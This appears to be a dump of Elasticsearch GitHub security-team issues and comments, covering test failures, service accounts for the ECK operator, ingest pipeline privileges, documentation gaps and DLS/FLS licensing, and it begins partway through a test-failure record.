REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.transport.netty4.SimpleSecurityNetty4ServerTransportTests.testFailToSend"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=sr-ME \
  -Dtests.timezone=Africa/Bamako \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true

REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.transport.netty4.SimpleSecurityNetty4ServerTransportTests.testVersionFrom1to1"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=sr-ME \
  -Dtests.timezone=Africa/Bamako \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true

REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.transport.netty4.SimpleSecurityNetty4ServerTransportTests.testVoidMessageCompressed"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=sr-ME \
  -Dtests.timezone=Africa/Bamako \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true
```

**Reproduces locally?**: yes

**Applicable branches**: 7.x

**Failure history**:
<!--
Link to build stats and possible indication of when this started failing and how often it fails
<https://build-stats.elastic.co/app/kibana>
-->
**Failure excerpt**:
```
org.elasticsearch.xpack.ssl.SSLErrorMessageCertificateVerificationTests > testMessageForHttpClientHostnameVerificationFailure FAILED
16:20:51     java.lang.AssertionError: 
16:20:51     Expected: a throwable with message of a string containing ""Certificate"" ignoring case
16:20:51          but: was <javax.net.ssl.SSLException: Connection reset> at sun.security.ssl.Alert.createSSLException(Alert.java:127)
16:20:51         at __randomizedtesting.SeedInfo.seed([AD420F801CD295C7:AF1435585E4172F4]:0)
16:20:51         at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
16:20:51         at org.junit.Assert.assertThat(Assert.java:956)
16:20:51         at org.junit.Assert.assertThat(Assert.java:923)
16:20:51         at 
```","Pinging @elastic/es-security (Team:Security)Apparently the latest JDK8 updates made it so this fails with a different error and this has been masked because 7.x has been failing in general in FIPS mode ( tracked in https://github.com/elastic/elasticsearch/issues/64379 which will hopefully be fixed by https://github.com/elastic/elasticsearch/issues/64776 )Another failure of `SimpleSecurityNioTransportTests.testConcurrentSendRespondAndDisconnect` for 7.13 with JDK16: https://gradle-enterprise.elastic.co/s/5kevwhgfekf3y

It could be transient since it failed only once in last 7 days. It may also not be related to the original issue raised here. But I am attaching it here since it may be transient and not worth its own issue and it is kinda related to this one.

The error message is
> org.elasticsearch.transport.NodeDisconnectedException: [TS_B_6][127.0.0.1:18602][internal:transport/handshake] disconnected

And it logs warnings of:
```
javax.net.ssl.SSLException: Closed engine without completely sending the close alert message. |  
-- | --
  | at org.elasticsearch.xpack.security.transport.nio.SSLDriver.close(SSLDriver.java:161) ~[main/:?] |  
  | at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:74) ~[elasticsearch-core-7.13.0-SNAPSHOT.jar:7.13.0-SNAPSHOT] |  
  | at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:116) ~[elasticsearch-core-7.13.0-SNAPSHOT.jar:7.13.0-SNAPSHOT] |  
  | at org.elasticsearch.core.internal.io.IOUtils.close(IOUtils.java:66) ~[elasticsearch-core-7.13.0-SNAPSHOT.jar:7.13.0-SNAPSHOT] |  
  | at org.elasticsearch.xpack.security.transport.nio.SSLChannelContext.closeFromSelector(SSLChannelContext.java:207) ~[main/:?] |  
  | at org.elasticsearch.nio.EventHandler.handleClose(EventHandler.java:229) [elasticsearch-nio-7.13.0-SNAPSHOT.jar:7.13.0-SNAPSHOT] |  
  | at org.elasticsearch.nio.EventHandler.postHandling(EventHandler.java:187) [elasticsearch-nio-7.13.0-SNAPSHOT.jar:7.13.0-SNAPSHOT] |  
  | at org.elasticsearch.nio.NioSelector.processKey(NioSelector.java:239) [elasticsearch-nio-7.13.0-SNAPSHOT.jar:7.13.0-SNAPSHOT] |  
  | at org.elasticsearch.nio.NioSelector.singleLoop(NioSelector.java:163) [elasticsearch-nio-7.13.0-SNAPSHOT.jar:7.13.0-SNAPSHOT] |  
  | at org.elasticsearch.nio.NioSelector.runLoop(NioSelector.java:120) [elasticsearch-nio-7.13.0-SNAPSHOT.jar:7.13.0-SNAPSHOT] |  
  | at java.lang.Thread.run(Thread.java:831) [?:?]
```The test `SimpleSecurityNioTransportTests.testConcurrentSendRespondAndDisconnect` failed again recently with a similar error message and the same warnings: https://gradle-enterprise.elastic.co/s/7yd4nadtxacn2",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,1175521134,"ECK operator service account","### Description

Hi,

This issue is to discuss the addition of an Elasticsearch service account for the ECK operator.
 
For the moment the ECK operator creates an internal user which is granted the `superuser` role to interact with Elasticsearch. We think that the operator would benefit from a dedicated service account with a more restricted set of privileges.

My understanding is that the closest cluster privilege that would match the operator needs would be the `manage` cluster privilege. However, unless I'm missing something we don't need the `indices:admin/*` actions.

I did a few preliminary tests with the following cluster privilege:

```java
    public static final NamedClusterPrivilege ORCHESTRATION = new ActionClusterPrivilege(""orchestration"", Set.of(""cluster:*""), ALL_SECURITY_PATTERN);
```

I also added the `monitor` index privilege to allow the ECK operator to access `_cat/shards`, so the overall `ServiceAccount` and its `RoleDescriptor` would be something along those lines:

```diff
--- a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/service/ElasticServiceAccounts.java
+++ b/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/service/ElasticServiceAccounts.java
@@ -12,6 +12,7 @@ import org.elasticsearch.xpack.core.security.authz.RoleDescriptor;
 import org.elasticsearch.xpack.core.security.authz.store.ReservedRolesStore;
 import org.elasticsearch.xpack.core.security.user.User;
 
+import java.util.Collections;
 import java.util.List;
 import java.util.Map;
 import java.util.Objects;
@@ -22,6 +23,22 @@ final class ElasticServiceAccounts {
 
     static final String NAMESPACE = ""elastic"";
 
+    private static final ServiceAccount ORCHESTRATION_ACCOUNT = new ElasticServiceAccount(
+        ""orchestration"",
+        new RoleDescriptor(
+            NAMESPACE + ""/orchestration"",
+            new String[] { ""orchestration"" },
+            new RoleDescriptor.IndicesPrivileges[]{
+                RoleDescriptor.IndicesPrivileges.builder().indices(""*"").privileges(""monitor"").build(),
+            },
+            new RoleDescriptor.ApplicationResourcePrivileges[] {},
+            null,
+            null,
+            null,
+            Collections.emptyMap()
+        )
+    );
```

FYI here are the APIs used by the ECK operator:
* licence management (`/_license/*`)
* cluster settings management (`/_cluster/settings`)
* Shutdown API
* Autoscaling API
* Manage voting exclusion
* Shards information from `/_cat/shards`
* Cluster health from `/_cluster/health`

Let me know if you have any question, and if you have any thoughts on this proposal.

Thanks !","Pinging @elastic/es-security (Team:Security)Thanks @barkbay that's an interesting use case.

A few thoughts:
- this service account should be an [operator user](https://www.elastic.co/guide/en/elasticsearch/reference/current/configure-operator-privileges.html#designate-operator-users), but we currently support only users in the `file` realm
- we probably should use [file-based service account tokens](https://www.elastic.co/guide/en/elasticsearch/reference/current/service-tokens-command.html) to avoid calling an API
- The service account cannot be file-based, so it will be available to all deployments and not just ECK
- I suppose this will not replace the `elastic` superuserThere's a a few ways we could approach this.

What we need is:
- a way for a service account to be an operator
- a way for that service account not to be an operator when it is authenticated with an API-based token

One option would be:
- Add a flag to a service account to mark it as an operator (that is, this account is _always_ an operator)
- Add another flag (or possibly the same flag) to a service account to mark that it only accepts file token and not API tokens.

Alternatively:
- Support service accounts in `operator_users.yml`
- But only if that service account authenticated with a file based token.

That issue with the latter is that it means the same account has different access (i.e. operator or non-operator) depending on the type of token used. We have tried to avoid that so far, so I'd prefer a model that prevented an API-token usage for this account.  Tim's suggestions are technically feasible (either block API token or only treat file token as operator user). But my question is more about whether ""service account"" is a good mix with ""operator user"". So far, my understanding for ""service account"" is that it is used for services that can potentially managed by end-users, e.g., fleet-server or kibana instance. It is possible that end-user can run their own fleet-server which connects to a Cloud ES deployment. Therefore, service account is by design accessible to end-users, while ""operator user"" is by design *not* accessible (or even visible because it is defined in file) to end-users. Also, any change to service account has a high cost because it is built into the code which means a new release is needed. While ""operator user"" is more flexibile since they are defined externally and does not have to tie to ES's release cycle. In this sense, if the ""service"" is more fluid in terms of privileges, ""service account"" may not be a good fit. Are the privileges required by ECK operator stable enough or can be tied to ES release cycle?

Going back to Tim's suggestions, all of them involves using the file based token. This means ECK at least needs to manage this file. So it is not completely free for ECK even if we take the option of ""Add a flag to a service account to mark it as an operator (that is, this account is always an operator)"". Does managing this one file a considerable advantage over managing the a file realm user for ECK?Hi,

First of all thanks for your feedback and thoughts 🙇 

ECK does not rely (yet?) on the operator privilege. I think there are two things to consider:
* As explained[ in this issue](https://github.com/elastic/cloud-on-k8s/issues/4996), users could disable the use of operator privileges anytime, but we could also enforce its use and add `xpack.security.operator_privileges.enabled` to [the list of settings that are only managed by ECK](https://github.com/elastic/cloud-on-k8s/blob/721cccfd905f43c345c7957fbfe173ea3ebb6bbf/pkg/apis/elasticsearch/v1/fields.go#L50-L68) (which can be seen as a kind of ""deny list"").
* If ECK enables the operator privileges by default, it might be a breaking change for users currently relying on the `superuser` role. I'm not 100% sure it is a true statement though: the [""operator only"" APIs](https://www.elastic.co/guide/en/elasticsearch/reference/current/operator-only-functionality.html#operator-only-apis) should only be called by the orchestration process, and [""operator-only"" settings](https://www.elastic.co/guide/en/elasticsearch/reference/current/operator-only-functionality.html#operator-only-dynamic-cluster-settings) can still be set in the Elasticsearch configuration file.

> So far, my understanding for ""service account"" is that it is used for services that can potentially be managed by end-users, e.g., fleet-server or kibana instance. It is possible that end-user can run their own fleet-server which connects to a Cloud ES deployment. Therefore, service account is by design accessible to end-users, while ""operator user"" is by design not accessible (or even visible because it is defined in file) to end-users.

I see your point. My understanding was that service accounts should be the preferred way to manage ""technical"" users. By ""technical"" I mean anything that is not a person, for example a stack application or the ECK operator.

> Are the privileges required by ECK operator stable enough or can be tied to ES release cycle?

I _think_ the privileges required by ECK should be pretty stable: I would expect any new API to be consumed by ECK to be related to its orchestration purpose, as such I would also expect the relevant privileges to be ""automatically"" included in the operator privileges.

> Going back to Tim's suggestions, all of them involves using the file based token. This means ECK at least needs to manage this file.

This is already the case, ECK can generate the service account tokens, and inject them in `$ES_HOME/config/service_tokens` in all the ES cluster containers.> My understanding was that service accounts should be the preferred way to manage ""technical"" users.

Maybe eventually, but I don't think we (ES) have ever drawn that line.

One of the design goals for service accounts (as they exist now) is to separate what is part of the orchestrated product (that is the existence of the service account & its privileges) from what is managed by the orchestrator (specifically the credentials, which need to be sync'd between ES and the client application).
This was helpful because the old model of defining these accounts as file based users required the orchestrator to own everything - the existence of the user, its roles & its password - just so it could be responsible for the password (and manage the lifecycle of it).

A service account for the orchestrator feels different. Maybe the behaviour ends up being mostly the same (although per the above comments, they're not _exactly_ the same), but logically it's not an account for running an orchestrated product, it _is_ the orchestrator.  
More concretely, to @ywangd's comment above, it's not clear to me what tangible difference it would make if ECK were to move from a file based _user_ to a file based _service token_. Understanding the benefit would be helpful.

> ECK does not rely (yet?) on the operator privilege.

I think that means that if we were to move forward with this, we probably want a model where the code defines that ""this service account only supports file based tokens"", rather than something that ties it in operator-privileges.> This was helpful because the old model of defining these accounts as file based users required the orchestrator to own everything - the existence of the user, its roles & its password - just so it could be responsible for the password
> [...]

I think that's what we would like here: if the user and the role for the operator itself is managed by Elasticsearch then the ECK operator only needs to manage the token/password.

> Understanding the benefit would be helpful.

[I think the main argument is that we are relying on the `superuser` role now](https://github.com/elastic/elasticsearch/issues/85171#issue-1175521134), which does not feel great:

>> For the moment the ECK operator creates an internal user which is granted the superuser role to interact with Elasticsearch. We think that the operator would benefit from a dedicated service account with a more restricted set of privileges.
",no,">enhancement,:Security/Security,team-discuss,Team:Security,"
elastic/elasticsearch,629750134,"Security privileges for ingest pipelines","Currently we have minimal support in Security for restricting access to ingest pipelines. There is a single dedicated privilege, `manage_ingest_pipelines`, that provides access to CRUD APIs for pipeline definitions.

We should improve this model in the following 2 ways:

- make the `manage_ingest_pipelines` privilege a ""configurable cluster privilege"", so that admins can specify that users can manage pipelines only in a _certain namespace_, instead of all the pipelines. Ideally, we should also create a ""read"" type of privilege, also ""configurable"" for pipeline namespaces, so that users can only see the pipeline definition, without being permitted to change or remove it.
- create a new type of privilege that restricts access to pipelines during ingestion. The exact format for defining the new privilege is still to be determined. But it must restrict access to an index and a pipeline simultaneously, e.g. permits the usage of pipelines whose names match the ""pipeline-format1-\*"" wildcard only on indices under the ""index-test-\*"" namespace. However, there are some pipelines that have the same outcome no matter the target index (they are used to re-route documents to other indices) in which case restricting access to the pipeline by index name is not necessary.

During a recent brainstorm inside the ES Security team, we've identified that in order to support restricting access to the pipeline usage during ingestion, we must refactor the execution of pipelines from https://github.com/elastic/elasticsearch/blob/a9338672c5d4e10150e88a4d56f05cf0a0215373/server/src/main/java/org/elasticsearch/action/bulk/TransportBulkAction.java#L195 as an internal transport action. This way, Security will be able to intercept this call and reject individual bulk index requests that reference unauthorized pipelines. Can someone from @elastic/es-core-features please give some feedback on this? 



","Pinging @elastic/es-security (:Security/Authorization)Related https://github.com/elastic/elasticsearch/issues/48028 .> This way, Security will be able to intercept this call and reject individual bulk index requests that reference unauthorized pipelines. Can someone from @elastic/es-core-features please give some feedback on this?

I think this makes sense. Initially I was hoping this could be done by just introspecting a bulk request in security, but then we don't know about default and final pipelines. Also noted in #57968, in a pipeline the `_index` can be changed and potential other pipelines can execute via a redirect. So a dedicated internal action seems like the right choice to properly authorize whether a user can use specific pipelines.",no,">enhancement,:Data Management/Ingest Node,:Security/Authorization,Team:Data Management,Team:Security,"
elastic/elasticsearch,975766380,"Use a more informative API response when updating a user","I think one cannot tell from the API response whether the user was actually updated or not.

```
POST /_security/user/jacknich
{
  ""password"" : ""l0ng-r4nd0m-p@ssw0rd"",
  ""roles"" : [ ""admin"" ],
  ""full_name"" : ""Jack Nicholson"",
  ""email"" : ""jacknich@example.com"",
  ""metadata"" : {
    ""intelligence"" : 7
  }
}
```

```
{
  ""created"" : true
}
```

```
PUT /_security/user/jacknich
{
  ""password"" : ""l0ng-r4nd0m-p@ssw0rd"",
  ""roles"" : [ ""colonel"" ],
  ""full_name"" : ""Nathan Jessup"",
  ""email"" : ""jacknich@example.com"",
  ""metadata"" : {
    ""intelligence"" : 7
  }
}
```

```
{
  ""created"" : false
}
```

...and again

```
PUT /_security/user/jacknich
{
  ""password"" : ""l0ng-r4nd0m-p@ssw0rd"",
  ""roles"" : [ ""colonel"" ],
  ""full_name"" : ""Nathan Jessup"",
  ""email"" : ""jacknich@example.com"",
  ""metadata"" : {
    ""intelligence"" : 7
  }
}
```

```
{
  ""created"" : false
}
```","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1256260797,"`xpack.security.enrollment.enabled` is missing from the docs","`xpack.security.enrollment.enabled` is missing from the `Security settings in Elasticsearch` documentation page.

I would have expected to find it in the `General security settings` section, but a search for the word `enrollment` has no results anywhere in the page

Here is a link to the page in 8.3 documentation.
- https://www.elastic.co/guide/en/elasticsearch/reference/8.3/security-settings.html#general-security-settings","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)This issue seems similar to #85375.If I start Elasticsearch 8.2.2 with the default elasticsearch.yml, Security-on-by-default auto-generates this configuration. Notice the second setting is `xpack.security.enrollment.enabled`. If a customer attempts to look up these auto-generated settings in Elasticsearch security settings documentation, the `xpack.security.enrollment.enabled` setting is missing.

```
#----------------------- BEGIN SECURITY AUTO CONFIGURATION -----------------------
#
# The following settings, TLS certificates, and keys have been automatically      
# generated to configure Elasticsearch security features on 01-06-2022 13:47:56
#
# --------------------------------------------------------------------------------

# Enable security features
xpack.security.enabled: true

xpack.security.enrollment.enabled: true

# Enable encryption for HTTP API client connections, such as Kibana, Logstash, and Agents
xpack.security.http.ssl:
  enabled: true
  keystore.path: certs/http.p12

# Enable encryption and mutual authentication between cluster nodes
xpack.security.transport.ssl:
  enabled: true
  verification_mode: certificate
  keystore.path: certs/transport.p12
  truststore.path: certs/transport.p12
# Create a new cluster with the current node only
# Additional nodes can still join the cluster later
cluster.initial_master_nodes: [""DEMO-MACHINE""]

# Allow HTTP API connections from anywhere
# Connections are encrypted and require user authentication
http.host: 0.0.0.0

# Allow other nodes to join the cluster from anywhere
# Connections are encrypted and mutually authenticated
#transport.host: 0.0.0.0

#----------------------- END SECURITY AUTO CONFIGURATION -------------------------
```<img width=""935"" alt=""image"" src=""https://user-images.githubusercontent.com/49510754/176654792-c0eb4624-5142-4a99-b00c-f40b99be7a89.png"">
Using the configuration shown above, this error always appears:
<img width=""1661"" alt=""image"" src=""https://user-images.githubusercontent.com/49510754/176656399-d82e86ea-1655-4e64-ad24-d91ff635d5a5.png"">

When using：xpack.security.enabled: false，Problem solving. At this time, xpack authentication has been closed. How to solve it.Hello @f1558, thanks very much for your interest in Elasticsearch.

This appears to be a user question, and we'd like to direct these kinds of things to the [Elasticsearch forum](https://discuss.elastic.co/c/elastic-stack/elasticsearch/6). If you can stop by there, we'd appreciate it.

I am going to hide your comment, because it is not directly related to this issue. It is important to us that GitHub issues remain focused on the topics for which they are intended, as they are an important part of our engineering process.

Thanks.> `xpack.security.enrollment.enabled` is missing from the `Security settings in Elasticsearch` documentation page.
> 
> I would have expected to find it in the `General security settings` section, but a search for the word `enrollment` has no results anywhere in the page
> 
> Here is a link to the page in 8.3 documentation.
> 
> * https://www.elastic.co/guide/en/elasticsearch/reference/8.3/security-settings.html#general-security-settings

Hi i'm confirm. No information about this setting. Maybe it's not critical, but give please some info because this enabled by default.",no,">docs,Team:Docs,Team:Security,:Security/AutoConfiguration,"
elastic/elasticsearch,1287132273,"Extract API key doc creation from `ApiKeyService` ","Both `newDocument` and `buildUpdatedDocument` should be moved into a dedicated builder class, out of `ApiKeyService`.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,415433354,"Documentation > Security REST API > Has Privileges","The documentation should highlight that `native realm` authentication needs to be enabled in order for the API to return a 200 response for the user calling the endpoint, if that user was created in the `native` realm.

https://www.elastic.co/guide/en/elasticsearch/reference/master/security-api-has-privileges.html

Recently discussed with @tvernum when implementing the .NET client integration tests.","The issue we had was that the tests were creating a user in the native realm, but the native realm was not in the authentication chain, so when you tried to call `_has-privileges` it failed to authenticate. But that would have been true for any API that you called.

So if we did something like this, it would mean adding this to every security API (and arguably all APIs with a ""If security is enabled..."" introduction)

> In order to call this API, you must be able to authenticate to the Elasticsearch REST interface.

I don't think we want to do that.

What we proably should look at, is some way for the Put/Get User APIs to indicate that the native realm is not enabled, so while the user exists & is enabled, they can't actually authenticate.

For roles, we return `transient_metadata` that indicates when a role has been dynamically disabled (which will happen if it uses unlicensed features):
For example:
```
    ""metadata"" : { },
    ""transient_metadata"" : {
      ""enabled"" : true
    }
```

Perhaps we need something similar on the GetUser API if the native realm is not enabled.Pinging @elastic/es-security[doc issue triage]",no,">docs,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1334257524,"Check DLS feature before accessing indices access control","This PR changes the order in which document level security feature is checked.
The indention is to avoid loading indices access control as much as possible.
In case the DLS feature is not enabled there is no need to loop and check DLS at all.","@elasticmachine update branch",yes,">enhancement,>non-issue,:Security/Authorization,Team:Security,v8.6.0,"
elastic/elasticsearch,928907614,"GET /_all API's response includes closed indices with a alias on security enabled clusters, which varies from that on security not enabled clusters","<!--
GitHub is reserved for bug reports and feature requests; it is not the place
for general questions. If you have a question or an unconfirmed bug , please
visit the [forums](https://discuss.elastic.co/c/elasticsearch).  Please also
check your OS is [supported](https://www.elastic.co/support/matrix#show_os).
If it is not, the issue is likely to be closed.

For security vulnerabilities please only send reports to security@elastic.co.
See https://www.elastic.co/community/security for more information.

Please fill in the following details to help us reproduce the bug:
-->

**Elasticsearch version** (`bin/elasticsearch --version`):Version: 7.13.2, Build: default/tar/4d960a0733be83dd2543ca018aa4ddc42e956800/2021-06-10T21:01:55.251515791Z, JVM: 16

**Plugins installed**: []

**JVM version** (`java -version`):16

**OS version** (`uname -a` if on a Unix-like system):Ubuntu 20.04.2 LTS

**Description of the problem including expected versus actual behavior**:
I think the responses of `GET /_all` should be same despite of whether security is enabled. But I find the response doesn't include closed indices with alias when access /_all API on security not enabled elasticsearch clusters, while it varies from the response when access /_all API on security enabled elasticsearch clusters. Why?  
**Steps to reproduce**:

Please include a *minimal* but *complete* recreation of the problem,
including (e.g.) index creation, mappings, settings, query etc.  The easier
you make for us to reproduce it, the more likely that somebody will take the
time to look at it.

 1. Enable security of elasticsearch cluster, and http basic auth is required to access the cluster.
 2. PUT test
 3. PUT test/_alias/test_alias
 4. POST test/_close
 5. GET _all
 6. Disable security of the elasticsearch cluster, GET _all and compare the response with step 5.


**Provide logs (if relevant)**:


","Pinging @elastic/es-security (Team:Security)This is the same underlying issue as https://github.com/elastic/elasticsearch/issues/32238
I'm having the same issue as this tooStill not fixed in 7.15.1",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1011059403,"Add a QA test infrastructure for Security on by default","For e2e integration testing of Security on
by default we need a special infrastructure
to support following scenarios:
- Single Node installation:
   . archive: we will need to validate that during the installation:
        -TLS certificates are generated
        -Security configuration is written to disk
        -The elastic user password is generated and set
        -Kibana enrollment token is created
        -Elasticsearch starts
        -Elastic user credentials and enrollment token and HTTP CA
          certificate fingerprint are printed in stdout
   . package: we will need to validate that during the installation:
        -TLS certificates are generated
        -Security configuration is written
        -The elastic user password is generated
        -Information is shown on screen
  .  docker: we will need to validate that during the installation:
        -TLS certificates are generated
        -Security configuration is written to disk
        -The elastic user password is generated and set
        -Kibana and node enrollment tokens are created
        -Elasticsearch starts
        -Elastic user credentials and enrollment tokens and
          HTTP CA certificate fingerprint are printed in the terminal output
- Multi Node and Single Host installation:
    For multiple nodes installation we will need (for all types of installations)
    be able to start a second node with an enrollment token from Single
    Node installation output ^^ and validate that:
        - TLS certificates are stored
        - Security configuration is written to disk
        - Elasticsearch starts and can communicate and retrieve information
           from the first node ^^
- Multi Node and Multi Host installation:
   For multiple nodes and multi host installation we will need
  (for all types of installations) after the single node installation ^^
  change newly generated elasticsearch.yml file to bind to a
  non-localhost address for the transport layer and start a
  second node with an enrollment token from Single Node
  installation output ^^ and validate that:
        - TLS certificates are stored
        - Security configuration is written to disk
        - Elasticsearch starts and can communicate and retrieve
           information from the first node ^^","The first scenario I'm pretty sure can be pretty well covered by packaging tests. Correct me if I'm wrong @jkakavas @albertzaharovits but the packaging tests in PRs like https://github.com/elastic/elasticsearch/pull/77231 essentially verify everything listed above, at least for the single node scenario.

For the multi node scenario I _think_ we can do this similarly to how we handle BWC tests. Essentially we just need to spin up a single node, grab the enrollment token, spin up a second node using that token and validate all is well..

We have no mechanism for multi-host testing of any kind. All of our CI testing runs on a single host. We don't do multi-host testing for any other multi-node scenarios so I'd question whether it's really necessary in this scenario either. I'm apt to say no, unless there is something unique around this scenario vs any other multi-node cluster tests we already run.> The first scenario I'm pretty sure can be pretty well covered by packaging tests.

Yes, this is correct. What we basically need as you identified is to do something about what is referred above as ""Multi Node and Single Host installation"". We don't need to care about all installation types, this is what packaging tests are for. 

> For the multi node scenario I think we can do this similarly to how we handle BWC tests. Essentially we just need to spin up a single node, grab the enrollment token, spin up a second node using that token and validate all is well..

Absolutely. The fact that the cluster formed is a test success in this case, and if we can use this cluster to run an ESRestTestCase against, then we can figure out meaningful tests to run against it. If not, cluster successful formation is more than enough. 
One caveat though is that we won't be printing an enrollment token for ES nodes on startup by default, as elasticsearch still binds to localhost for the transport layer by default and you can't - by default again, due to heap size - run multiple nodes on the same host. That means that we'd need to run a cli tool against that node ( `bin/elasticsearch-create-enrollment-token -s node` ) to get a token instead of capturing it from the first node startup output. 

For what is worth, we _will_ have Packaging tests for this too, I have a PR ready to open waiting for #77231 and #77718 to be merged. 

> We have no mechanism for multi-host testing of any kind. All of our CI testing runs on a single host. We don't do multi-host testing for any other multi-node scenarios so I'd question whether it's really necessary in this scenario either. I'm apt to say no, unless there is something unique around this scenario vs any other multi-node cluster tests we already run.

We don't need this. This use case can be reduced to the previous one that we will be testing. > One caveat though is that we won't be printing an enrollment token for ES nodes on startup by default, as elasticsearch still binds to localhost for the transport layer by default and you can't - by default again, due to heap size - run multiple nodes on the same host. That means that we'd need to run a cli tool against that node ( bin/elasticsearch-create-enrollment-token -s node ) to get a token instead of capturing it from the first node startup output.

I'm not sure I understand. We run all sorts of multi-node tests. When we setup test clusters by default we set the node heap size to 512m. What's the issue with localhost binding as well? Again, with test clusters we use ephemeral ports.> I'm not sure I understand. We run all sorts of multi-node tests. When we setup test clusters by default we set the node heap size to 512m. What's the issue with localhost binding as well? Again, with test clusters we use ephemeral ports.

Apologies, I wasn't clear. This was not meant to be a comment on the test infrastructure, but a comment to elasticsearch's behavior with regards to the enrollment process. We have decided to not print an enrollment token for other nodes by default as :

- Elasticsearch binds to localhost only for the transport layer so nodes from other hosts cannot connect to it. 
- By default, elasticsearch will run with the heap size set to half the RAM of the host, so it's impractical to run multi-node single host clusters ( again, _by default_. It is understood that if you want to, you configure it so ) 

The effect this would have in our tests is that there will be no node enrollment token to capture from the output of the first node starting, but we;d need to run the CLI tool after the node starts, to an enrollment token. Hope this is clearer now. > The effect this would have in our tests is that there will be no node enrollment token to capture from the output of the first node starting, but we;d need to run the CLI tool after the node starts, to an enrollment token. Hope this is clearer now.

Yup, makes sense now. So the flow is just slightly different, in that getting the enrollment token is an explicit act by the user, not something we just dump the the log automatically, but otherwise we still need to fetch the token (however that's done) and then supply it to another node.Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Security,v8.6.0,"
elastic/elasticsearch,317446915,"esusers and syskeygen should run with security manager","*Original comment by @jaymode:*

The esusers and syskeygen CLITools should run under the security manager and ensure that these tools only have write permissions to the appropriate files


",,no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,1162086132,"Document recommendations for DLS queries","### Description

We don't provide much advice about how to use Document Level Security well, but we should.

Some specific ideas:
- Because the DLS query is run in isolation of the search request (which is not necessarily the expectation people have), the efficiency of the DLS query is very important. Expensive queries should be avoided.
- Term-level queries should be preferred over full-text queries, both for accurate of the security and for performance.
- A single user with multiple DLS queries on the same index is supported, but discouraged. 
- Using ingest time features (logstash, ES ingest processors) to transform documents so that they can be queried efficiently by DLS is preferred (e.g. instead of using a DLS `wildcard` query, perform the same check at ingest time so that the DLS query can do a simple `term` check) 
- Caching relies on identical query text - templated queries will typically perform less well than static queries.
","Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-docs (Team:Docs)",no,">docs,:Security/Authorization,Team:Security,"
elastic/elasticsearch,985981013,"Creation of API keys with DLS/FLS should error if license is incompatible","[Dcoument and Field Level Security](https://www.elastic.co/guide/en/elasticsearch/reference/current/document-level-security.html) (DLS/FLS) is a [platinum licensed](https://www.elastic.co/subscriptions) feature, while API key is Basic licensed. Today, when [creating an API Key](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-create-api-key.html) with DLS/FLS in the role descriptors, the request will success regardless of the cluster's license. However, if the license is incompatible with DLS/FLS, the created API key will not work as expected.

In constrast, when [creating roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-put-role.html), the API performs the check for DLS/FLS and license and throws an error if the two do not match. This behaviour is more explicit and predictable. We should align API key creation to be the same:

1. Throw error if the role descriptors specified in the request body have DLS/FLS and license is incompatible.
2. Also throw error if the owner's role descriptors have DLS/FLS and license is incompatible.

For point 2, an alternative is to automatically remove any offending role descriptors and just create the key with remaining descriptors of the owner. This may seem to align better with how user authentication works, where roles with DLS/FLS is silently dropped for an user if license does not permit it. However, I prefer the stricter behaviour of erroring out because:
* Silently skipping the roles is confusing to end-users because it is invisible. There is no good place in the API response to issue warning and API key's role descriptors are not retrievable.
* Erroring out is a more explicit and less lenient behaviour which is generally better.
* We allow not specifying any role descriptors in the API key creation request. In this case, the API key's role descriptors are the same as those of the owners. As said in point 1, we always throw error for invalid role descriptors of the API key and this should apply regardless whether the descriptors are explicit or implied. It feels weird, if we sometimes throw error and sometimes do not for the same set of role descriptors just depend on where they appear.
* Unlike API keys, roles can actually be fixed. We should recommend users to fix the role instead of silently ignoring it.

NOTE this issue focuses only on creating new keys. It will not change behaviours of any existing keys. ","Pinging @elastic/es-security (Team:Security)For point 2, another alternative is to allow the creation if remaining user roles (roles that do not have DLS/FLS) are a superset of requested API key role descriptors. For a contrived example, if the user has both the `superuser` role and and a DLS/FLS role, the user should still have sufficient privileges to create API keys even when DLS/FLS role is disabled. Since the role desctipors involved do not have any DLS/FLS, it should be technically feasible to perform the subset/superset check (thinking has_privileges). 

I don't like this option, but want to discuss it for completeness. The issues are:
* API key creation never checks whether the API key role descriptors are a subset of user roles. So it is weird that we would has this check just because of license.
* Whether the creation would be successful is rather difficult to understand/predict especially if the user roles or API key role descriptors are complex.
* It's a leniency without really good reasons (that I can think of)@ywangd I'm a bit worried about throwing an error if the creator has DLS/FLS, that I consider a pretty different case from failing if the API key contains DLS/FLS.

If you specify DLS/FLS as part of the API key creation request, you get an error and you can handle it, for example by modifying the request and repeating it. If you cannot create any API key because your roles are ""broken"", you may need to ask someone else (with `manage_security`) to fix it, and this may be harder than expected.

If I get it correctly, as a user if you have a role with DLS/FLS it will be ignored with no warning. Is the experience with API keys different if we assume creator's descriptors with DLS/FLS are ignored too?> Throw error if the role descriptors specified in the request body have DLS/FLS and license is not incompatible.

Should be

Throw error if the role descriptors specified in the request body have DLS/FLS and license is ~not~ incompatible.
